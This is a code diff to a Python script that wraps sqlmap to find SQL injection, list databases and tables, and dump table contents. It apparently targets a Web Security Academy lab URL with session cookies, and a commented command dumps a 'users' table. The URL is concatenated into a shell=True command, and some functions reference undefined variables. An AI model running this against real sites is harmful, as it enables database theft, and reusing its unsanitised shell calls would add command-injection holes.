@@ -4,11 +4,6 @@ def scan_url_vulnerability(url):
 	query = "sqlmap -u "+ url +" --batch"
 	vuls=[]
 
-	# f = open("output.txt", "w")
-	# f.write("query:" + query)
-	# f.write("\n")
-	# f.close()
-
 	print(query)
 	print("scanning vulnerability")
 	process = subprocess.Popen([query],
@@ -19,13 +14,14 @@ def scan_url_vulnerability(url):
 	stdout, stderr = process.communicate()
 
 	for x in range(len(stdout)):
+		#get_time_starting
 		if (stdout[x:(x+8)])== "starting":
 			time_starting = stdout[(x+11):(x+19)]
 			f = open("output.txt", "w")
 			f.write("time_starting:" + time_starting)
 			f.write("\n")
 			f.close()
-			# print("time starting = " + time_starting)
+		#get_vulnerability
 		if (stdout[x:(x+4)]) == "Type":
 			if stdout[x+6] == "b":
 				vuls.append("B")
@@ -35,11 +31,20 @@ def scan_url_vulnerability(url):
 				vuls.append("T")
 			else:
 				vuls.append(stdout[x+6])
+		#get_time_ending
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
+
 	f = open("output.txt", "a")
 	for vul in vuls:
 		f.write("vul:" + vul)
 		f.write("\n")
 	f.close()
+
+	if len(vuls) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:" + time_ending)
+		f.close()
 	
 	return vuls		
 
@@ -91,7 +96,13 @@ def scan_url_database(url, tech, level):
 					f.write("dbs:" + db)
 					f.write("\n")
 				f.close()		
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
 
+	if len(dbs) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:" + time_ending)
+		f.close()
 
 	return dbs
 
@@ -137,14 +148,14 @@ def scan_url_tables(url, tech, level, db):
 		f.write("\n")
 	f.close()
 
-	f = open("output.txt", "a")
-	f.write("time_ending:" + time_ending)
-	f.write("\n")
-	f.close()
+	if len(tables) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:" + time_ending)
+		f.close()
 
 	return tables
 
-def scan_url_content(url, tech, level, db, table):
+def scan_url_dump(url, tech, level, db, table):
 	query = "sqlmap -u " + url + " --technique=" + tech + " --level " + level + " -D " + db + " -T " + table + " --dump" +" --batch"
 
 	print(query)
@@ -156,9 +167,36 @@ def scan_url_content(url, tech, level, db, table):
 						shell = True, text = True)
 	stdout,stderr = process.communicate()
 
-	f = open("output_test.txt", "w")
-	f.write(stdout)
+	newspace = 0
+	str_search = "Table: " + table
+	for x in range(len(stdout)):
+		if stdout[x:(x+7+len(table))] == str_search:
+			for i in range(x, len(stdout),1):
+				if stdout[i:(i+7)] == "entries":
+					entries = int(stdout[(x+9+len(table)):(i-1)])
+			for j in range(x, len(stdout), 1):
+				if stdout[j] == "\n":
+					newspace += 1
+					if newspace == 2:
+						start = j+1
+					if newspace == (2+entries+1+3):
+						end = j
+						dump = stdout[start:end]
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
+			# print("time ending = " + time_ending)	
+
+	f = open("output.txt", "a")
+	f.write(stdout[start:end])
+	f.write("\n")
 	f.close()
+	
+	f = open("output.txt", "a")
+	f.write("time_ending:" + time_ending)
+	f.write("\n")
+	f.close()
+
+	return dump
 
 
 def scan_query_vulnerability(query):
@@ -174,6 +212,7 @@ def scan_query_vulnerability(query):
 	stdout, stderr = process.communicate()
 	
 	for x in range(len(stdout)):
+		#get_time_starting
 		if (stdout[x:(x+8)])== "starting":
 			time_starting = stdout[(x+11):(x+19)]
 			f = open("output.txt", "a")
@@ -181,7 +220,7 @@ def scan_query_vulnerability(query):
 			f.write("\n")
 			f.close()
 			# print("time starting = " + time_starting)
-
+			# get_vulnerability
 		if (stdout[x:(x+4)]) == "Type":
 			if stdout[x+6] == "b":
 				vuls.append("B")
@@ -191,12 +230,20 @@ def scan_query_vulnerability(query):
 				vuls.append("T")
 			else:
 				vuls.append(stdout[x+6])
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
+			# print("time ending = " + time_ending)
+
 	f = open("output.txt", "a")
 	for vul in vuls:
 		f.write("vul:" + vul)
 		f.write("\n")
 	f.close()
-		
+
+	if len(vuls) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:" + time_ending)
+		f.close()		
 
 	return vuls	
 
@@ -246,7 +293,13 @@ def scan_query_database(query):
 					f.write("dbs:" + db)
 					f.write("\n")
 				f.close()		
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
 
+	if len(dbs) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:" + time_ending)
+		f.close()
 
 	return dbs
 
@@ -284,7 +337,6 @@ def scan_query_tables(query):
 					i+=1
 		if (stdout[x:(x+6)]) == "ending":
 			time_ending = stdout[(x+9):(x+17)]
-			# print("time ending = " + time_ending)	
 
 	f = open("output.txt", "a")
 	for i in range(len(tables)):
@@ -292,15 +344,54 @@ def scan_query_tables(query):
 		f.write("table:" +tables[i].lstrip())
 		f.write("\n")
 	f.close()
-			
+
+	if len(tables) == 0:
+		f = open("output.txt", "a")
+		f.write("time_ending:"  + time_ending)
+		f.close()
+
+	return tables
+
+def scan_query_dump(query):
+
+	print(query)
+	print("scanning dump")
+
+	process = subprocess.Popen([query], 
+						stdin=subprocess.PIPE,
+						stdout=subprocess.PIPE,
+						stderr=subprocess.PIPE,
+						shell = True, text = True)
+	stdout,stderr = process.communicate()
+	newspace = 0
+	str_search = "Table: " + table
+	for x in range(len(stdout)):
+		if stdout[x:(x+7+len(table))] == str_search:
+			for i in range(x, len(stdout),1):
+				if stdout[i:(i+7)] == "entries":
+					entries = int(stdout[(x+9+len(table)):(i-1)])
+			for j in range(x, len(stdout), 1):
+				if stdout[j] == "\n":
+					newspace += 1
+					if newspace == 2:
+						start = j+1
+					if newspace == (2+entries+1+3):
+						end = j
+						dump = stdout[start:end]
+		if (stdout[x:(x+6)]) == "ending":
+			time_ending = stdout[(x+9):(x+17)]
+
+	f = open("output.txt", "a")
+	f.write(stdout[start:end])
+	f.write("\n")
+	f.close()
+	
 	f = open("output.txt", "a")
 	f.write("time_ending:" + time_ending)
 	f.write("\n")
 	f.close()
 
-def scan_query_content():
-	print("scan content")
-				
+	return dump
 
 def main():
 	mode = 3
@@ -310,10 +401,9 @@ def main():
 		url =  f.read()
 		f.close()
 
-
 		vuls = scan_url_vulnerability(url)
 		if len(vuls) == 0:
-			print("website have not vulnerability sql injection")
+			print("The website has not sql injection vulnerability")
 		else:
 			dbs = scan_url_database(url, vuls[0], level[0])
 		if len(dbs) == 0:
@@ -323,14 +413,28 @@ def main():
 		if len(tables) == 0:
 			print("we can not scan tables")
 		else:
-			scan_url_content(url, vuls[0],level[0], dbs[0], tables[0])
-
+			dump = scan_url_dump(url, vuls[0],level[0], dbs[0], tables[0])
 	if(mode == 2):
 		query = 'sqlmap -u https://0a4900570425c01dc0470466006f00b2.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=29PMYUHjgNUKvmwI; session=3zGP0MQtrqEMxU10ZH7KPlM48JC9ZfZ0" --level 2 -technique=B --dbs --batch'
+		# query = 'sqlmap -u https://0a4900570425c01dc0470466006f00b2.web-security-academy.net/filter?category=Corporate+gifts --cookie="TrackingId=29PMYUHjgNUKvmwI; session=3zGP0MQtrqEMxU10ZH7KPlM48JC9ZfZ0" --level 2 --technique=B -D public -T users --dump --batch'
 		dbs = scan_query_database(query)
 	if(mode == 3):
 		db = "public"
+		table = "users"
 		print("test")
+
+		sqlmap = {
+			"url": "",
+			"message": "",
+			"vulnerability": ["", ""],
+			"databases": "",
+			"tables": ["", ""],
+			"dump": ""
+		}
+
+
+		print(sqlmap)
+		# dump = get_dump(table)
 
 if __name__ == "__main__":
 	main()
